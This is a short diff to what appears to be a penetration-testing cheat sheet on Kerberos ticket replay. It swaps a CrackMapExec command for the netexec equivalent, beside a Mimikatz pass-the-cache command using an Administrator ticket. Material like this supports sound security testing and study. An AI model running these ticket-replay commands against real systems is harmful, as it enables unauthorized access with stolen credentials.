@@ -25,7 +25,7 @@ There are two types of tickets in Kerberos:
 ## Replay Kerberos Tickets
 
 * Mimikatz: `mimikatz.exe "kerberos::ptc C:\temp\TGT_Administrator@lab.local.ccache"`
-* CrackMapExec: `KRB5CCNAME=/tmp/administrator.ccache crackmapexec smb 10.10.10 -u user --use-kcache`
+* netexec: `KRB5CCNAME=/tmp/administrator.ccache netexec smb 10.10.10 -u user --use-kcache`
 
 
 ## Convert Kerberos Tickets
